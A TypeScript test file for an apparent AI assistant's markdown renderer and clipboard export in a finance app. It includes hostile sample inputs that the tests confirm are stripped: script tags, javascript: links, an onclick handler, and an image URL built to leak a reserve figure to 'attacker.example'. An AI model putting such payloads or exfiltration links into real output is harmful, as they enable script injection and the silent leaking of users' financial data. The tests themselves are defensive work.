import assert from "node:assert/strict";
import { test } from "node:test";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import BaniMarkdown from "../src/components/ai/BaniMarkdown";
import { buildBaniClipboard, writeBaniClipboard } from "../src/components/ai/baniClipboard";

const baseURI = "https://bantai.example/app/overview";
function text(value: string) {
  return { nodeType: 3, nodeValue: value, textContent: value };
}
type Fixture = ReturnType<typeof text> | {
  nodeType: number;
  localName: string;
  textContent: string;
  childNodes: Fixture[];
  getAttribute: (name: string) => string | null;
  hasAttribute: (name: string) => boolean;
  baseURI: string;
};
function el(localName: string, children: (Fixture | string)[] = [], attributes: Record<string, string> = {}): Fixture {
  const childNodes = children.map(child => typeof child === "string" ? text(child) : child);
  return {
    nodeType: 1, localName, childNodes, baseURI,
    textContent: childNodes.map(child => child.textContent).join(""),
    getAttribute: name => attributes[name] ?? null,
    hasAttribute: name => Object.hasOwn(attributes, name),
  };
}
const exportReply = (...nodes: Fixture[]) => buildBaniClipboard(el("div", nodes) as unknown as HTMLElement);

test("Markdown renders semantic formatting, scoped links, and keyboard-scrollable tables", () => {
  const source = [
    "## Reserve",
    "",
    "**PHP 1,250.00** and *provisional*.",
    "",
    "3. Review the [guide](https://example.com/guide).",
    "4. See [workspace](/app/org/overview).",
    "",
    "| Category | Amount |",
    "| --- | ---: |",
    "| Dues | ₱1,250.00 |",
    "",
    "[Unsafe](javascript:alert%281%29)",
    "",
    "<script>alert(1)</script>",
    "",
    "```",
    "first",
    "second",
    "```",
  ].join("\n");
  const markup = renderToStaticMarkup(createElement(BaniMarkdown, { content: source, allowWorkspaceLinks: false }));
  assert.match(markup, /<h2[^>]*>Reserve<\/h2>/);
  assert.match(markup, /<strong[^>]*>PHP 1,250.00<\/strong>/);
  assert.match(markup, /<em[^>]*>provisional<\/em>/);
  assert.match(markup, /<ol start="3"/);
  assert.match(markup, /href="https:\/\/example.com\/guide"/);
  assert.match(markup, /role="region" aria-label="Response table" tabindex="0"/);
  assert.match(markup, /<th scope="col"/);
  assert.match(markup, /₱1,250.00/);
  assert.doesNotMatch(markup, /href="\/app|javascript:|<script|alert\(1\)/);
  assert.equal(markup.match(/<pre\b/g)?.length, 1);

  const workspaceMarkup = renderToStaticMarkup(
    createElement(BaniMarkdown, {
      content: "Summary ![pixel](https://attacker.example/leak?reserve=50000) [Budgets](/app/org/1/budgets)",
      allowWorkspaceLinks: true,
    })
  );
  assert.doesNotMatch(workspaceMarkup, /<img\b|attacker\.example/);
  assert.match(workspaceMarkup, /href="\/app\/org\/1\/budgets"/);
});

test("clipboard HTML and plain text preserve formatting, currency and readable spacing", () => {
  const payload = exportReply(
    el("h2", ["Reserve"]),
    el("p", ["Available: ", el("strong", ["₱1,250.00"]), " (", el("em", ["provisional"]), ").",
      el("br"), "See ", el("a", ["the methodology"], { href: "/docs", onclick: "unsafe()" }), "."]),
    el("ol", [el("li", ["Check dues"]), el("li", ["Review expenses"])], { start: "3" }),
    el("pre", [el("code", ["gross - expenses\n  = ₱1,250.00\n"])]),
  );
  assert.equal(payload.text, "Reserve\n\nAvailable: ₱1,250.00 (provisional).\nSee the methodology.\n\n3. Check dues\n4. Review expenses\n\ngross - expenses\n  = ₱1,250.00");
  assert.match(payload.html, /<strong>₱1,250.00<\/strong>/);
  assert.match(payload.html, /<em>provisional<\/em>/);
  assert.match(payload.html, /<a href="https:\/\/bantai.example\/docs">the methodology<\/a>/);
  assert.match(payload.html, /<ol start="3">/);
  assert.doesNotMatch(payload.html, /onclick|unsafe\(\)/);
});

test("clipboard keeps semantic table rows and exports them as TSV, with blank cells", () => {
  const payload = exportReply(
    el("table", [
      el("thead", [el("tr", [el("th", ["Category"]), el("th", ["Amount"]), el("th", ["Notes"])])]),
      el("tbody", [
        el("tr", [el("td", ["Dues"]), el("td", ["₱1,250.00"]), el("td")]),
        el("tr", [el("td", ["Expenses"]), el("td", ["PHP -400.00"]), el("td", ["posted"])]),
      ]),
    ]),
    el("p", ["End"]),
  );
  assert.equal(payload.text, "Category\tAmount\tNotes\nDues\t₱1,250.00\t\nExpenses\tPHP -400.00\tposted\n\nEnd");
  assert.match(payload.html, /<table[^>]*><thead><tr><th/);
  assert.match(payload.html, /<tbody><tr><td[^>]*>Dues<\/td>/);
  assert.doesNotMatch(payload.text, /[|*]/);
});

test("financial summaries copy visible record names and values without interactive or unsafe content", () => {
  const payload = exportReply(el("div", [
    el("h4", ["Budgets"], { class: "text-primary" }),
    el("div", [
      el("button", [el("span", ["Spring Fair"]), el("svg", ["icon data"])], { "data-bani-copy-label": "", "aria-label": "Open Spring Fair" }),
      el("span", ["25%"]),
    ]),
    el("div", [el("span", ["Spent: PHP 500.00"]), el("span", ["Remaining: PHP 1,500.00"])]),
    el("button", ["Show more"]),
    el("div", ["Taking you to Budgets…"], { role: "status" }),
    el("a", ["unsafe destination"], { href: "javascript:alert(1)" }),
    el("script", ["unsafe script"]),
  ], { "data-bani-copy-financial": "" }));
  assert.match(payload.text, /Spring Fair · 25%\nSpent: PHP 500.00 · Remaining: PHP 1,500.00/);
  assert.match(payload.html, /<strong><span>Spring Fair<\/span><\/strong>/);
  assert.doesNotMatch(payload.html, /<button|Show more|Taking you|aria-label|javascript|unsafe script|icon data|text-primary/);
});

class TestClipboardItem {
  constructor(readonly formats: Record<string, Blob>) {}
}
const Item = TestClipboardItem as unknown as typeof ClipboardItem;
const payload = { html: "<strong>₱500.00</strong>", text: "₱500.00" };

test("rich copy writes both clipboard formats in a single item", async () => {
  const result = await writeBaniClipboard(payload, {
    Item,
    clipboard: {
      async write(items) {
        assert.equal(items.length, 1);
        const { formats } = items[0] as unknown as TestClipboardItem;
        assert.deepEqual(Object.keys(formats), ["text/html", "text/plain"]);
        assert.equal(await formats["text/html"].text(), payload.html);
        assert.equal(await formats["text/plain"].text(), payload.text);
      },
      async writeText() { assert.fail("rich copy succeeded"); },
    },
    copyText() { assert.fail("rich copy succeeded"); },
  });
  assert.equal(result, true);
});

test("unsupported or rejected rich copying falls back to plain text and then selection", async () => {
  const calls: string[] = [];
  const clipboard = {
    async write() { calls.push("rich"); throw new Error("unsupported HTML"); },
    async writeText(value: string) { calls.push(value); },
  };
  assert.equal(await writeBaniClipboard(payload, { Item, clipboard }), true);
  assert.deepEqual(calls, ["rich", "₱500.00"]);
  assert.equal(await writeBaniClipboard(payload, {
    Item,
    clipboard: { ...clipboard, async writeText() { throw new Error("permission denied"); } },
    copyText(value) { assert.equal(value, payload.text); return true; },
  }), true);
  assert.equal(await writeBaniClipboard(payload, { copyText: () => false }), false);
});

test("copy exports all returned report rows and ledger details even while cards show previews", () => {
  const preview = el("div", [
    el("h2", ["Financial transparency report"]),
    el("p", ["Reserve is provisional."]),
    el("div", [el("p", ["Preview of three campaigns"]), el("button", ["Show one more"])], { "data-bani-report-index": "1" }),
    el("div", [el("p", ["Ledger preview"]), el("button", ["Ledger breakdown"])], { "data-bani-report-index": "2" }),
    el("div", [el("p", ["Budget preview"])], { "data-bani-report-index": "3" }),
  ]);
  const payload = buildBaniClipboard(preview as unknown as HTMLElement, [
    { tool: "navigate_to", result: {} },
    { tool: "list_collections_campaigns", result: [1, 2, 3, 4].map(i => ({
      title: `Dues ${i}`, currency: "PHP", collected_amount: "320.00", assessed_amount: "400.00", target_amount: "500.00",
    })) },
    { tool: "get_treasury_summary", result: { currency: "USD", reserve_balance: "-1250.50", provisional: true,
      calculation_formula: "Reserve = Collected - Directly Paid Expenses - Advances Released + Actual Cash Returns" } },
    { tool: "list_budgets_and_burn_rate", result: [{ name: "Spring <Fair>", currency: "PHP", spent_amount: "500.00",
      remaining_budget: "1500.00", allocated_amount: "2000.00", committed_amount: "0.00", burn_percent: 25 }] },
  ]);
  assert.equal(payload.html.match(/<table\b/g)?.length, 3);
  assert.match(payload.html, /<h2>Financial transparency report<\/h2>/);
  assert.match(payload.html, /<td[^>]*>Dues 4<\/td>/);
  assert.match(payload.html, /Spring &lt;Fair&gt;/);
  assert.match(payload.text, /Dues 4\tPHP 320\.00\tPHP 400\.00\tPHP 500\.00/);
  assert.match(payload.text, /4 campaigns returned by this lookup/);
  assert.match(payload.text, /Recorded reserve\tUSD -1,250\.50/);
  assert.match(payload.text, /Provisional ledger figures/);
  assert.match(payload.text, /Directly Paid Expenses - Advances Released \+ Actual Cash Returns/);
  assert.doesNotMatch(payload.text, /preview|show one more|ledger breakdown/i);
});
